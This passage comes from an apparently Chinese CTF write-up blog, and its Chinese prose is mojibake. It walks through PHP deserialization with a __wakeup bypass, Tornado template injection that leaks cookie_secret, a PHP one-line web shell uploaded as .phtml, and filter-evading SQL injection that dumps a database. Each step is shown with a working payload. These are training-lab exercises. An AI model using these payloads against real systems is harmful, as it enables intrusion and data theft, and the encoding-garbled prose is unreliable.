operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>æ— ç”¨ä¿¡æ¯<br/> æŸ¥çœ‹index.phpæºç ï¼Œ<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\18e53652c8c745e792c51904f84c988d.png\"/><br/> å‘ç°åŒ…å«class.phpæ–‡ä»¶ï¼Œé‡‡ç”¨getä¼ å‚selectï¼Œè¿˜æœ‰ä¸ªphpååºåˆ—åŒ–å‡½æ•°unserialize()</p>\n<p>æŸ¥çœ‹å¦ä¸€ä¸ªæ–‡ä»¶class.php<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\8260fabcba434f14852f31b9b8b12b6c.png\"/><br/> æŸ¥çœ‹æºç <br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\7de5123510ea4a83a162ef5eb73df487.png\"/></p>\n<p>å‘ç°æœ‰è¾“å‡ºflagçš„æ¡ä»¶ï¼Œæ¥ä¸‹æ¥ä»£ç å®¡è®¡</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Name</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'nonono'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'yesyes'</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token comment\">//åˆ›å»ºå¯¹è±¡æ—¶è§¦å‘</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\t<span class=\"token comment\">//ä½¿ç”¨unserializeæ—¶è§¦å‘</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'guest'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\t<span class=\"token comment\">//å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span>\n\t<span class=\"token comment\">//å¦‚æœpassword=100ï¼Œusername=adminï¼Œåœ¨æ‰§è¡Œ__destruct()çš„æ—¶å€™å¯ä»¥è·å¾—flag</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span> <span class=\"token operator\">!=</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"You name is: \"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/br&gt;\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"You password is: \"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/br&gt;\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">global</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>       \n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>é€šè¿‡ååºåˆ—åŒ–æ¥æ‰§è¡Œdestructå‡½æ•°ï¼Œå¦‚æœpassword=100ï¼Œusername=adminï¼Œå¯ä»¥è·å¾—flag</p>\n<p>æ„é€ åºåˆ—åŒ–</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Name</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'nonono'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'yesyes'</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Name</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\a7971ddc43314fb1991bc24fe866962f.png\"/></p>\n<p>æ¥ç€æ‰§è¡Œååºåˆ—åŒ–ï¼Œæ‰§è¡Œä¹‹å‰é™åˆ¶æ€§wakeupå‡½æ•°ï¼Œä½†æ˜¯__wakeupå‡½æ•°ä¼šä¿®æ”¹usernameçš„å€¼ï¼Œæ‰€ä»¥ä¸€ä¸ªæƒ³åŠæ³•ç»•è¿‡wakeup<br/> <strong>ç»•è¿‡æ–¹æ³•ï¼šå½“æˆå‘˜å±æ€§æ•°ç›®å¤§äºå®é™…æ•°ç›®æ—¶å¯ç»•è¿‡wakeupæ–¹æ³•(CVE-2016-7124)</strong></p>\n<ul><li> <p><strong>æ–¹æ³•ä¸€ï¼šç”¨åºåˆ—åŒ–åŠ %00</strong><br/> <strong>private</strong>ï¼šå±æ€§è¢«åºåˆ—åŒ–çš„æ—¶å€™å±æ€§åä¼šå˜æˆ<code>%00ç±»å%00å±æ€§å</code>ï¼Œé•¿åº¦è·Ÿéšå±æ€§åé•¿åº¦è€Œæ”¹å˜ã€‚<strong>åŠ %00çš„ç›®çš„å°±æ˜¯ç”¨äºæ›¿ä»£\\0</strong></p> <pre><code class=\"prism language-php\"><span class=\"token argument-name\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Name\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">14</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"%00Name%00username\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">14</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"%00Name%00password\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">i</span><span class=\"token punctuation\">:</span><span class=\"token number\">100</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span>\n\n</code></pre> <p>æ„é€ payloadï¼š<code>/?select=O:4:%22Name%22:3:{s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;}</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\73cac5fc6ba84c0ea13c5fad78a22b21.png\"/></p> </li><li> <p><strong>æ–¹æ³•äºŒï¼šç›´æ¥urlç¼–ç </strong></p> <pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Name</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'nonono'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'yesyes'</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Name</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//è¿›è¡Œurlç¼–ç ï¼Œé˜²æ­¢%00å¯¹åº”çš„ä¸å¯æ‰“å°å­—ç¬¦åœ¨å¤åˆ¶æ—¶ä¸¢å¤±</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre> <p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\d5af9c76767a4672825ae8fad0c640b2.png\"/></p> </li></ul>\n<h1><a id=\"_2018easy_tornado_665\"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h1>\n<p>é¦–å…ˆå‡ºæ¥ä¸‰ä¸ªé“¾æ¥<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\25ad9d2849d44657b038d8010cfe69b5.png\"/>æŸ¥çœ‹flag.txt<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\df923eedf933449eaece4a3384515929.png\"/>æç¤ºflagåœ¨/fllllllllllllagä¸­<br/> OKï¼ŒçŸ¥é“äº†ç¬¬ä¸€ä¸ªæ¡ä»¶ï¼Œfilename=/fllllllllllllag<br/> æŸ¥çœ‹welcome.txt<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\a3dc1402cc5c4ea4896a238804d2632f.png\"/>æŸ¥çœ‹hints.txt<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\20fae3fba0e2460cb5d3d1eb3e737ead.png\"/><br/> åˆ†æä¸€ä¸‹<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\e8e12948eeab44e0ad58b08f793bc28b.png\"/><br/> è¿™é‡Œæœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°filenameï¼Œæ–‡ä»¶çš„åç§°ï¼Œæˆ‘ä»¬é€šè¿‡æŸ¥çœ‹flag.txtæ–‡ä»¶çŸ¥é“ï¼Œè—flagçš„æ–‡ä»¶åä¸ºfllllllllllllagï¼›ç¬¬äºŒä¸ªå‚æ•°filehashï¼Œç¿»è¯‘ä¸€ä¸‹ï¼šæ–‡ä»¶å“ˆå¸Œï¼Œä¹Ÿå°±æ˜¯åŠ å¯†äº†</p>\n<p>åŠ å¯†æ–¹æ³•åœ¨ç¬¬ä¸‰ä¸ªæ–‡ä»¶ä¸­<code>md5(cookie_secret+md5(filename))</code>ï¼Œå°†cookie_secret+filenameçš„å€¼md5åŠ å¯†åçš„å€¼ï¼Œæ•´ä½“å†md5åŠ å¯†ï¼›ç„¶åæŠŠæœ€åçš„å€¼èµ‹ç»™filehash</p>\n<p>ç°åœ¨æœ€é‡è¦çš„ä¸€æ­¥å°±æ˜¯è·å–cookie_secretçš„å€¼ï¼Œè¿™ä¸ªæˆ‘ä¸ä¼šã€‚çœ‹ä¸€ä¸‹å¤§ä½¬ä»¬æ€ä¹ˆåš</p>\n<p>åœ¨è¯•çš„è¿‡ç¨‹ä¸­ï¼Œå°è¯•åªè¾“å…¥filenameçš„å€¼è€Œå¿½ç•¥filehashï¼Œç»“æœå‡ºæ¥ä»¥ä¸‹å†…å®¹ï¼ŒURLå˜æˆ<code>/error?msg=Error</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\ce4f0d7f779b4cdcab5390cf70a385a8.png\"/>æˆ‘ä»¬å‰é¢å¿½è§†äº†ç¬¬äºŒä¸ªæ–‡ä»¶å†…å®¹<code>render</code>ã€‚æˆ‘ä»¥ä¸ºåªæ˜¯ä¸ªæ²¡ç”¨çš„ä¿¡æ¯ï¼Œç»“æœä¸€æŸ¥ï¼Œè¿˜æ˜¯ä¸ªæŒºé‡è¦çš„ä¸œè¥¿ï¼Œæ€ªæˆ‘è§å¾—å¤ªå°‘</p>\n<blockquote>\n<p><strong>render</strong>æ˜¯pythonä¸­çš„ä¸€ä¸ª<strong>æ¸²æŸ“å‡½æ•°</strong>ï¼Œä¹Ÿå°±æ˜¯ä¸€ç§<strong>æ¨¡æ¿</strong>ï¼Œé€šè¿‡è°ƒç”¨çš„å‚æ•°ä¸åŒï¼Œç”Ÿæˆä¸åŒçš„ç½‘é¡µ ï¼Œå¦‚æœç”¨æˆ·å¯¹renderå†…å®¹å¯æ§ï¼Œä¸ä»…å¯ä»¥æ³¨å…¥XSSä»£ç ï¼Œè€Œä¸”è¿˜å¯ä»¥é€šè¿‡{<!-- -->{}}è¿›è¡Œä¼ é€’å˜é‡å’Œæ‰§è¡Œç®€å•çš„è¡¨è¾¾å¼ã€‚<br/> <strong>Tornado</strong>æ˜¯ä¸€ç§ Web æœåŠ¡å™¨è½¯ä»¶çš„å¼€æºç‰ˆæœ¬ã€‚Tornado å’Œç°åœ¨çš„ä¸»æµ Web æœåŠ¡å™¨æ¡†æ¶ï¼ˆåŒ…æ‹¬å¤§å¤šæ•° Python çš„æ¡†æ¶ï¼‰æœ‰ç€æ˜æ˜¾çš„åŒºåˆ«ï¼šå®ƒæ˜¯éé˜»å¡å¼æœåŠ¡å™¨ï¼Œè€Œä¸”é€Ÿåº¦ç›¸å½“å¿«ã€‚</p>\n</blockquote>\n<p>ä»¥ä¸Šæ˜¯æˆ‘çš„åˆ†æè¿‡ç¨‹ï¼Œä¸‹é¢çœ‹ä¸€ä¸‹å¤§ä½¬çš„è§£æ³•</p>\n<p>ç”±äºæ˜¯pythonçš„ä¸€ä¸ªæ¨¡æ¿ï¼Œé¦–å…ˆæƒ³åˆ°çš„å°±æ˜¯<strong>æ¨¡æ¿æ³¨å…¥</strong>{<!-- -->{}}ï¼Œæœ€ç»ˆæ‰¾åˆ°çš„ä½ç½®æ˜¯æŠ¥é”™ç½‘é¡µï¼ˆéšä¾¿è®¿é—®ä¸€ä¸ªæ–‡ä»¶æ˜¯æ›´æ”¹å®ƒçš„ç­¾åå°±å¯ä»¥è¿›å…¥ï¼‰ï¼Œé‡Œé¢çš„å‚æ•°msgã€‚<br/> renderæ˜¯æ¨¡æ¿æ³¨å…¥ï¼Œç»è¿‡æµ‹è¯•å‘ç°è¿‡æ»¤äº†ã€‚æ„é€ payload:<code>/error?msg={<!-- -->{1*2}}</code></p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\5c2b0d3b191a4a02912a47163b895cbb.png\"/></p>\n<blockquote>\n<p>åœ¨tornadoæ¨¡æ¿ä¸­ï¼Œå­˜åœ¨ä¸€äº›å¯ä»¥è®¿é—®çš„å¿«é€Ÿå¯¹è±¡,è¿™é‡Œç”¨åˆ°çš„æ˜¯handler.settingsï¼ŒhandleræŒ‡å‘RequestHandlerï¼Œè€ŒRequestHandler.settingsåˆæŒ‡å‘self.application.settingsï¼Œæ‰€ä»¥handler.settingså°±æŒ‡å‘RequestHandler.application.settingsäº†ï¼Œè¿™é‡Œé¢å°±æ˜¯æˆ‘ä»¬çš„ä¸€äº›ç¯å¢ƒå˜é‡</p>\n</blockquote>\n<p>æ„é€ payload<code>/error?msg={<!-- -->{handler.settings}}</code></p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\f3ae2f5a929f41ddbf73b1ca8220b679.png\"/><br/> æ‰¾åˆ°cookie_secretä¸º<code>6e6e371d-7445-46db-8066-46e0e25c8b7a</code></p>\n<p>filenameçš„å€¼md5åŠ å¯†åä¸º<code>3bf9f6cf685a6dd8defadabfb41a03a1</code><br/> cookie_secret+filenameåŠ å¯†åçš„å€¼ä¸º<code>9ff081746c35f525a315a313ac1a00d8</code><br/> æ„é€ payloadï¼š<code>/file?filename=/fllllllllllllag&amp;filehash=9ff081746c35f525a315a313ac1a00d8</code></p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\ce4ec6423342408db279e5fca8065ddc.png\"/></p>\n<h1><a id=\"ACTF2020_Upload_711\"></a>[ACTF2020 æ–°ç”Ÿèµ›]Upload</h1>\n<p><strong>é¢˜ç›®ç±»å‹ï¼šæ–‡ä»¶ä¸Šä¼ ï¼Œä¸€å¥è¯æœ¨é©¬</strong><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\fe9e2bbe95a343e8a26dc36856e5623e.png\"/><br/> ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬<code>&lt;?php eval($_POST[a]);?&gt;</code>ï¼Œä¿®æ”¹åç¼€åä¸º<code>.jpg</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\d4fe51c92e754f4d80bd9055b85def4a.png\"/></p>\n<p>burpsuiteæŠ“åŒ…ï¼Œä¿®æ”¹åç¼€å<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\4278380cf2dc4b3ea53983eb5686c48b.png\"/><br/> çŸ¥é“ä¿®æ”¹ä¸º<code>.phtml</code>åæ˜¾ç¤ºä¸Šä¼ æˆåŠŸ<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\f66768bfc9b9421eae64d55aaff0249e.png\"/></p>\n<p>ä½¿ç”¨èšå‰‘è¿æ¥ï¼ŒURLåœ°å€ä¸ºï¼š<code>http://848a2803-bdd9-4890-be0e-526c8ce1433f.node4.buuoj.cn:81/./uplo4d/71056c0c9cb12f2b7d720156da9eabf1.phtml</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\08a9e92fae4a451ea442066c9b4ffac1.png\"/></p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\b07d635211b8439fbe45e181517bcb74.png\"/><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\5a5b27f0f2a64c2d8353896c4ce0f1c1.png\"/><br/> æ‹¿åˆ°flag~~</p>\n<h1><a id=\"_2019BabySQL_729\"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h1>\n<p><strong>é¢˜ç›®ç±»å‹ï¼šSQLæ³¨å…¥</strong><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\fe5a463c37cb4138b076bb8f3851e83d.png\"/></p>\n<p>è¾“å…¥ç”¨æˆ·åä¸º<code>admin</code>ï¼Œå¯†ç ä¸º<code>1'</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\b99ce5efe41f433eb114435fffe95bd2.png\"/><br/> ç”±æŠ¥é”™ä¿¡æ¯å¯çŸ¥å­˜åœ¨SQLæ³¨å…¥æ¼æ´<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\190d3427381d45c4aa513cbe6a2bdd8e.png\"/><br/> å…ˆè¯•ä¸€ä¸‹å¸¸è§„æ³¨å…¥ï¼š<code>/check.php?username=admin&amp;password=1' union select 1#</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\df8ab571e4e04ba28de2c61281ea3691.png\"/><br/> æ ¹æ®æŠ¥é”™ä¿¡æ¯çŒœæµ‹union ã€selectå¯èƒ½è¢«è¿‡æ»¤äº†ï¼Œè¯•ä¸€ä¸‹åŒå†™ç»•è¿‡<br/> <code>/check.php?username=admin&amp;password=1' ununionion seselectlect 1#</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\9ceabf25fd25408082d2ea59e9456d75.png\"/><br/> ç»§ç»­æŠ¥é”™ï¼ŒURLç¼–ç è¯•ä¸€ä¸‹ï¼Œç„¶åè¯•åˆ—æ•°<br/> payloadï¼š<code>/check.php?username=admin&amp;password=1' ununionion seselectlect 1,2,3%23</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\519ae9edb3db41fca7c3662558707a60.png\"/></p>\n<p>å‡ºç°å›æ˜¾ä½ç½®2å’Œ3</p>\n<p>çˆ†æ•°æ®åº“:<code>/check.php?username=admin&amp;password=1' ununionion seselectlect 1,2,group_concat(schema_name)frfromom(infoorrmation_schema.schemata) %23</code></p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\c67e6e5be4d04c329e0c76bb73c28a29.png\"/><br/> çŒœæµ‹flagåœ¨ctfé‡Œ<br/> çˆ†è¡¨ï¼š<code>/check.php?username=admin&amp;password=1' ununionion seselectlect 1,2, group_concat(table_name)frfromom(infoorrmation_schema.tables) whwhereere table_schema=\"ctf\" %23</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\dfdd98b6aff940d5989812992d30ff2e.png\"/><br/> æŸ¥å­—æ®µåï¼š<code>/check.php?username=admin&amp;password=pwd ' ununionion seselectlect 1,2,group_concat(column_name) frfromom (infoorrmation_schema.columns) whwhereere table_name=\"Flag\"%23</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\cb341fbe9c3a4cbbb52793a9d38fbb7e.png\"/><br/> <code>/check.php?username=admin&amp;password=pwd ' ununionion seselectlect 1,2,group_concat(flag) frfromom(ctf.Flag)%23</code></p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\2203d64738274ef5802622b4f58266f9.png\"/></p>\n<h1><a id=\"ACTF2020_BackupFile_761\"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h1>\n<p><strong>é¢˜ç›®ç±»å‹ï¼šå¤‡ä»½æ–‡ä»¶</strong></p>\n<ul><li> <p><strong>çŸ¥è¯†ç‚¹</strong></p>\n<ul><li><code>==</code>æ˜¯ä¸åˆ¤æ–­äºŒè€…æ˜¯å¦æ˜¯åŒä¸€æ•°æ®ç±»å‹ï¼Œè€Œ<code>===</code>æ˜¯æ›´ä¸ºä¸¥æ ¼çš„æ¯”è¾ƒï¼Œå®ƒä¸ä»…è¦æ±‚äºŒè€…å€¼ç›¸ç­‰ï¼Œè€Œä¸”è¿˜è¦æ±‚å®ƒä»¬çš„æ•°æ®ç±»å‹ä¹Ÿç›¸åŒã€‚</li><li>å¸¸è§çš„å¤‡ä»½æ–‡ä»¶åç¼€ï¼š<code>.rar .zip .7z .tar .gz .bak .swp .txt .html</code></li><li><code>is_numeric</code>å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²</li><li><code>intval()</code> å‡½æ•°ç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼</li><li>æ•°å­— åŠ  å­—æ¯ç­‰éæ•°å­—è½¬æ¢ \n    <blockquote>\n<p>var s = â€˜234stringâ€™;<br/> parseInt(s);ã€€//234<br/> parseFloat(s); 